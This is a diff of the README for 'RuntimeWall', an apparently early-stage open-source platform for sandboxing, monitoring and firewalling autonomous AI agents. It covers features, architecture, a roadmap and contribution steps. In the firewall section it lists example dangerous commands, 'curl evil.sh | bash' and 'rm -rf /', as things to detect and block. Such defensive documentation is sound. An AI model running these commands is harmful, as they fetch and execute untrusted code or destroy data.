@@ -2,8 +2,6 @@
 
 <div align="center">
 
-![RuntimeWall Banner](https://placehold.co/1200x300/0b1020/ffffff?text=RuntimeWall)
-
 ### Security-first runtime and governance platform for autonomous AI agents.
 
 _Run AI agents securely inside isolated sandboxes with runtime monitoring, session replay, MCP security, and observability._
@@ -11,155 +9,119 @@ _Run AI agents securely inside isolated sandboxes with runtime monitoring, sessi
 <p align="center">
   <a href="#features"><strong>Features</strong></a> ·
   <a href="#architecture"><strong>Architecture</strong></a> ·
-  <a href="#quick-start"><strong>Quick Start</strong></a> ·
+  <a href="#tech-stack"><strong>Tech Stack</strong></a> ·
   <a href="#roadmap"><strong>Roadmap</strong></a> ·
-  <a href="#vision"><strong>Vision</strong></a>
+  <a href="#quick-start"><strong>Quick Start</strong></a> ·
+  <a href="#contributing"><strong>Contributing</strong></a>
 </p>
 
 <p align="center">
-  <img src="https://img.shields.io/badge/runtime-security-blue" />
-  <img src="https://img.shields.io/badge/ai-agents-black" />
-  <img src="https://img.shields.io/badge/mcp-security-red" />
-  <img src="https://img.shields.io/badge/docker-runtime-green" />
-  <img src="https://img.shields.io/badge/open-source-orange" />
+  <img src="https://img.shields.io/badge/status-early%20development-yellow" alt="Status" />
+  <img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License" />
+  <img src="https://img.shields.io/badge/runtime-security-blue" alt="Runtime Security" />
+  <img src="https://img.shields.io/badge/mcp-security-red" alt="MCP Security" />
+  <img src="https://img.shields.io/badge/docker-runtime-green" alt="Docker Runtime" />
 </p>
 
 </div>
 
+> **Project status:** Early development. This repository currently contains project documentation and licensing. Application code (`apps/`, `runtime/`, etc.) is landing incrementally — see the [roadmap](#roadmap) and [open issues](https://github.com/RuntimeWall/RuntimeWall/issues).
+
 ---
 
-# Why RuntimeWall?
+## Why RuntimeWall?
 
 AI agents are rapidly gaining:
 
-- filesystem access
-- terminal execution
-- browser automation
+- Filesystem access
+- Terminal execution
+- Browser automation
 - GitHub permissions
-- cloud infrastructure control
-- autonomous deployment capabilities
+- Cloud infrastructure control
+- Autonomous deployment capabilities
 
-But the ecosystem still lacks:
+The ecosystem still lacks:
 
-- runtime isolation
-- AI-native security
-- observability
-- governance
+- Runtime isolation
+- AI-native security and governance
+- Observability and session replay
 - MCP protection
-- session replay
-- threat detection
+- Threat detection at execution time
 
-RuntimeWall is building the missing infrastructure layer.
+**RuntimeWall** is building the missing infrastructure layer.
 
-> Think Kubernetes + CrowdStrike + Browserbase + Vault for AI agents.
-
----
-
-# What is RuntimeWall?
-
-RuntimeWall is an open-source runtime platform that allows developers and enterprises to securely run autonomous AI agents inside isolated execution environments.
-
-It provides:
-
-- isolated Docker/Kubernetes sandboxes
-- runtime monitoring
-- command inspection
-- MCP runtime security
-- browser agent infrastructure
-- secret isolation
-- observability & replay
-- AI runtime firewalling
+> Think **Kubernetes + CrowdStrike + Browserbase + Vault** — for AI agents.
 
 ---
 
-# Features
+## What is RuntimeWall?
 
-## Secure Sandboxed Execution
+RuntimeWall is an open-source runtime platform for running autonomous AI agents inside isolated execution environments. It is designed to provide:
 
-Run:
-- Claude Code
-- Codex
-- OpenHands
-- Aider
-- custom agents
-
-inside isolated runtime environments.
-
----
-
-## Runtime AI Firewall
-
-Detect and block:
-
-- dangerous shell commands
-- prompt injection attempts
-- secret exfiltration
-- malicious package installs
-- suspicious network activity
-
-Example:
-
-```bash
-curl evil.sh | bash
-rm -rf /
-```
-
-RuntimeWall detects and blocks dangerous behavior before execution.
+| Capability | Description |
+|------------|-------------|
+| **Sandboxed execution** | Isolated Docker / Kubernetes runtimes for agents |
+| **Runtime firewall** | Block dangerous commands, exfiltration, and abuse |
+| **Observability** | Logs, metrics, and full session replay |
+| **MCP security** | Tool isolation, permissions, and runtime monitoring |
+| **Browser infrastructure** | Playwright-based agents in isolated Chromium |
+| **Secret isolation** | Scoped credentials — agents never see raw secrets |
 
 ---
 
-## Session Replay & Observability
+## Features
 
-Replay everything:
+_Planned capabilities — see [roadmap](#roadmap) for delivery phases._
 
-- terminal commands
-- prompts
-- browser actions
-- file changes
-- network activity
+### Secure sandboxed execution
 
-Like session replay for autonomous AI systems.
+Run agents such as Claude Code, Codex, OpenHands, Aider, or custom agents inside isolated runtime environments.
+
+### Runtime AI firewall
+
+Detect and block dangerous behavior before or during execution, including:
+
+- Dangerous shell commands (e.g. `curl evil.sh | bash`, `rm -rf /`)
+- Prompt injection patterns
+- Secret exfiltration
+- Malicious package installs
+- Suspicious network activity
+
+### Session replay and observability
+
+Replay and audit:
+
+- Terminal commands
+- Prompts and model I/O
+- Browser actions
+- File changes
+- Network activity
+
+### MCP runtime security
+
+Execute MCP tools with:
+
+- Isolated execution
+- Permission boundaries
+- Signed tool verification
+- Runtime monitoring
+- Tool-level access controls
+
+### Browser agent infrastructure
+
+Run browser agents using Playwright, isolated Chromium containers, session recording, and remote browser runtimes.
+
+### Secret isolation
+
+Agents do not receive long-lived credentials directly. Planned support for:
+
+- Temporary, scoped credentials
+- Secret proxying and runtime token injection
+- Isolated environment boundaries
 
 ---
 
-## MCP Runtime Security
-
-Securely execute MCP tools with:
-
-- isolated execution
-- permission boundaries
-- signed tool verification
-- runtime monitoring
-- tool-level access controls
-
----
-
-## Browser Agent Infrastructure
-
-Run browser agents securely using:
-
-- Playwright
-- isolated Chromium containers
-- session recording
-- remote browser runtimes
-
----
-
-## Secret Isolation
-
-Agents never directly see your real credentials.
-
-RuntimeWall supports:
-
-- temporary credentials
-- scoped secrets
-- secret proxying
-- isolated environments
-- runtime token injection
-
----
-
-# Architecture
+## Architecture
 
 ```text
 ┌───────────────────────┐
@@ -175,7 +137,7 @@ RuntimeWall supports:
            │
            ▼
 ┌───────────────────────┐
-│   Runtime Orchestrator│
+│ Runtime Orchestrator  │
 │ Docker / Kubernetes   │
 └──────────┬────────────┘
            │
@@ -188,41 +150,110 @@ RuntimeWall supports:
            ▼
 ┌───────────────────────┐
 │ Security Monitoring   │
-│ Firewall + Observability
+│ Firewall + Observability │
 └───────────────────────┘
 ```
 
 ---
 
-# Tech Stack
+## Tech Stack
 
 | Layer | Technology |
-|---|---|
-| Frontend | Next.js + Tailwind |
+|-------|------------|
+| Frontend | Next.js, Tailwind CSS |
 | Backend | Go |
-| Runtime | Docker |
-| Future Runtime | Kubernetes |
+| Runtime | Docker (Kubernetes planned) |
 | Database | PostgreSQL |
 | Terminal | xterm.js |
 | Realtime | WebSockets |
-| Monitoring | Grafana + Prometheus |
-| Browser Runtime | Playwright |
-| AI Gateway | LiteLLM |
+| Monitoring | Grafana, Prometheus |
+| Browser runtime | Playwright |
+| AI gateway | LiteLLM |
 
 ---
 
-# Quick Start
+## Roadmap
 
-## Clone RuntimeWall
+### Phase 1 — MVP runtime
+
+- [ ] Docker sandbox runtime
+- [ ] Web terminal attach
+- [ ] Session management
+- [ ] Runtime logs and command monitoring
+- [ ] Dangerous command detection
+- [ ] Basic runtime firewall
+
+### Phase 2 — Security and agents
+
+- [ ] Secret isolation and proxying
+- [ ] Session replay
+- [ ] MCP runtime security
+- [ ] Browser runtime (Playwright)
+- [ ] MCP security scanning
+
+### Phase 3 — Platform and enterprise
+
+- [ ] Kubernetes runtime orchestration
+- [ ] Multi-agent orchestration
+- [ ] Distributed runtime scheduling
+- [ ] GPU runtime support
+- [ ] RBAC, SSO / SAML
+- [ ] Governance policies and compliance tooling
+- [ ] AI SOC dashboard, risk scoring, threat intelligence
+
+---
+
+## Repository structure
+
+**Current layout:**
+
+```text
+RuntimeWall/
+├── LICENSE
+└── README.md
+```
+
+**Target layout:**
+
+```text
+RuntimeWall/
+├── apps/
+│   ├── web/          # Next.js dashboard
+│   └── api/          # Go API gateway
+├── runtime/
+│   ├── docker/
+│   ├── security/
+│   └── sandbox/
+├── packages/
+│   ├── cli/
+│   └── sdk/
+├── infra/
+│   ├── docker/
+│   ├── kubernetes/
+│   └── monitoring/
+└── docs/
+```
+
+---
+
+## Quick Start
+
+> Quick Start will be enabled as `apps/web` and `apps/api` land in the repository. Track progress on the [roadmap](#roadmap).
+
+### Prerequisites (planned)
+
+- Node.js 20+
+- Go 1.22+
+- Docker 24+
+
+### Clone the repository
 
 ```bash
 git clone https://github.com/RuntimeWall/RuntimeWall.git
 cd RuntimeWall
 ```
 
----
-
-## Frontend
+### Frontend (coming soon)
 
 ```bash
 cd apps/web
@@ -230,152 +261,63 @@ npm install
 npm run dev
 ```
 
----
-
-## API
+### API (coming soon)
 
 ```bash
 cd apps/api
-go run cmd/server/main.go
+go run ./cmd/server
 ```
 
----
-
-# Repository Structure
-
-```text
-RuntimeWall/
-├── apps/
-│   ├── web/
-│   └── api/
-│
-├── runtime/
-│   ├── docker/
-│   ├── security/
-│   └── sandbox/
-│
-├── packages/
-│   ├── cli/
-│   └── sdk/
-│
-├── infra/
-│   ├── docker/
-│   ├── kubernetes/
-│   └── monitoring/
-│
-└── docs/
-```
-
----
-
-# RuntimeWall Vision
-
-The future of software is autonomous.
-
-AI agents will:
-
-- deploy infrastructure
-- manage Kubernetes clusters
-- write production code
-- operate browsers
-- automate security operations
-- manage cloud environments
-
-But autonomous systems require:
-
-- runtime isolation
-- observability
-- governance
-- security boundaries
-- policy enforcement
-
-RuntimeWall aims to become:
-
-> The secure operating system for autonomous AI agents.
-
----
-
-# Roadmap
-
-- Docker sandbox runtime
-- Web terminal attach
-- Session management
-- Runtime logs
-- Command monitoring
-- Dangerous command detection
-- Runtime firewall
-- Secret isolation
-- Session replay
-- MCP runtime security
-- Browser runtime
-- Kubernetes runtime
-- Multi-agent orchestration
-- Distributed runtime scheduling
-- GPU runtime support
-- RBAC
-- SSO/SAML
-- Governance policies
-- Compliance tooling
-- AI SOC dashboard
-
----
-
-# Planned Future Features
-
-- AI runtime firewall
-- MCP security scanning
-- Browser agent infrastructure
-- Runtime threat intelligence
-- AI agent risk scoring
-- Autonomous pentesting labs
-- Agent observability platform
-- AI security analytics
-
----
-
-# Open Source
-
-RuntimeWall is fully open-source and community-driven.
-
-We welcome:
-
-- contributors
-- security researchers
-- infrastructure engineers
-- AI engineers
-- DevOps contributors
-- MCP ecosystem builders
-
----
-
-# Contributing
+### One-command local dev (planned)
 
 ```bash
-git checkout -b feat/amazing-feature
+docker compose up
 ```
-
-Commit:
-
-```bash
-git commit -m "Add amazing feature"
-```
-
-Push:
-
-```bash
-git push origin feat/amazing-feature
-```
-
-Open a Pull Request 🚀
 
 ---
 
-# License
+## Vision
 
-Apache 2.0
+The future of software is increasingly autonomous. AI agents will deploy infrastructure, manage clusters, write production code, operate browsers, and automate security operations — but only safely if we add runtime isolation, observability, governance, and policy enforcement.
+
+**RuntimeWall aims to become the secure operating system for autonomous AI agents.**
 
 ---
 
-# RuntimeWall
+## Contributing
 
-> Security and governance infrastructure for autonomous AI agents.
+We welcome contributors — security researchers, infrastructure engineers, AI engineers, DevOps, and MCP ecosystem builders.
+
+1. Fork the repository and create a branch:
+
+   ```bash
+   git checkout -b feat/your-feature
+   ```
+
+2. Commit your changes:
+
+   ```bash
+   git commit -m "Add your feature"
+   ```
+
+3. Push and open a pull request:
+
+   ```bash
+   git push origin feat/your-feature
+   ```
+
+Please open an [issue](https://github.com/RuntimeWall/RuntimeWall/issues) before large changes so we can align on design.
+
+For security vulnerabilities, please do **not** open a public issue — contact the maintainers privately (see `SECURITY.md` when published).
+
+---
+
+## License
+
+[Apache License 2.0](LICENSE)
+
+---
+
+<p align="center">
+  <strong>RuntimeWall</strong> — Security and governance infrastructure for autonomous AI agents.
+</p>
